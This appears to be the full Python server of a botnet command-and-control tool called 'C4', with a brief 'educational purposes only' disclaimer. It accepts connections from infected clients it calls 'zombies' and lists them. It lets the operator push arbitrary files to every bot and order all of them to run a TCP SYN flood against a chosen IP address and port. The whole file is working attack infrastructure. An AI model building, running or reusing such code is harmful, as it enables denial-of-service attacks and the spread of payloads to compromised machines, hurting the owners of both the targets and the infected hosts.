# C4 Command And Control Tool [SERVER]
# Written by: Lucas Rønnebro

# For educational purposes and research purposes only.
# For semi-documentation please refer to the readme, or help menu.
# Enjoy the tool!!

import asyncio
import aioconsole
import os
import sys

import c4_server_commands

HOST = '0.0.0.0'
PORT = 12345

connected_zombies = []
commandline_prefix = "user@C4:~$ "

def clearScreen():
    if (os.name == "nt"):
        os.system("cls")
    else:
        os.system("clear")
        
def get_ascii():
    with open("ascii_titles.txt", 'r', encoding='utf-8') as file:
        ascii_art = {}
        current_label = None
        current_art = []

        for line in file:
            line = line.rstrip('\r\n')
            if line.startswith('---') and line.endswith('---'):
                if current_label and current_art:
                    ascii_art[current_label] = '\n'.join(current_art)
                    current_art = []
                current_label = line.replace('---', '').strip()
            else:
                current_art.append(line)

        # Append the last ASCII art piece
        if current_label and current_art:
            ascii_art[current_label] = '\n'.join(current_art)

    return ascii_art

async def shell_menu():
    while True:
        clearScreen()
        print(get_ascii().get("C4 SHELL TITLE"))
        print(f"  Server started on: {HOST}:{PORT}\n\n")
        print("[1] Terminal")
        print("[2] Overview")
        print("[3] Exit\n")
        input = await aioconsole.ainput(commandline_prefix)
        
        if (input == "1"):
            await terminal()
            break
        elif (input == "2"):
            await overview()
            break
        elif (input == "3"):
            sys.exit()
    
async def terminal():
    clearScreen()
    print(get_ascii().get("C4 TERMINAL TITLE"))
    print("\n[help] for help\n[exit] to go back\n\n")
    while True:
        input = await aioconsole.ainput(commandline_prefix)
        await run_command(input)
    
async def run_command(command_input:str):
    tokens = command_input.split()
    if not tokens:
        print("Command does not exist")
        
    command = tokens[0]
    if command == "send": #Sending files to the clients
        try:
            file_path = str(tokens[tokens.index("-f") + 1]) #* Filepath Arg
            file_name = str(tokens[tokens.index("-n") + 1]) #* Filename Arg
            file_extension = str(tokens[tokens.index("-e") + 1]) #* File exstension Arg
            for writer in connected_zombies: #* Send to all targets
                await c4_server_commands.send_file(client_writer=writer, filepath=file_path, filename=file_name, extension=file_extension)
        except (ValueError, IndexError):
            print("Error: Format like this 'send -f [filepath]'")
    
    elif command == "SYNTACK": #* Start an TCP SYN packet attack
        ip_addr = str(tokens[tokens.index("-a") + 1])
        port = int(tokens[tokens.index("-p") + 1])
        aioconsole.ainput("Press [Enter] to stop the SYNTACK")
        while True:
            for writer in connected_zombies:
                await c4_server_commands.start_syn_flood(client_writer=writer, ip_addr=ip_addr, port=port)
            await asyncio.sleep(0.1)
            
        
    elif command == "bot_size": #Print out currently connected zombies
        print(f"There are/is currently {len(connected_zombies)} connected zombies")
    
    elif command == "help": #Get help
        print(get_ascii().get("TERMINAL HELP DESC"))
   
    elif command == "exit": #Go back
        await shell_menu()

async def overview():
    clearScreen()
    print(get_ascii().get("C4 ZOMBIES TITLE"))
    
    #Gets all currently connected clients and prints out their index + peername
    for _t in enumerate(connected_zombies):
        print(f"[{_t[0]}] {_t[1].get_extra_info('peername')}")
    
    print(f"There are/is currently {len(connected_zombies)} connected zombies")
    print("\n\n[r] to reload list\n[exit] to go back")
    #Logic for reloading list and going back
    while True:
        input = await aioconsole.ainput(f"\n{commandline_prefix}")
        
        if input == "r":
            await overview()
            break
        elif input == "exit":
            await shell_menu()
            break
        else:
            print("Command doesn't exist")

async def handle_client(reader:asyncio.StreamReader, writer:asyncio.StreamWriter):
    try:
        connected_zombies.append(writer)
        await writer.wait_closed()
    except asyncio.CancelledError:
        pass
    except ConnectionResetError:
        pass
    finally:
        connected_zombies.remove(writer)
        writer.close()

async def main():
    server = await asyncio.start_server(handle_client, HOST, PORT)
    await asyncio.gather(shell_menu(), server.serve_forever())

if __name__ == "__main__":
    asyncio.run(main())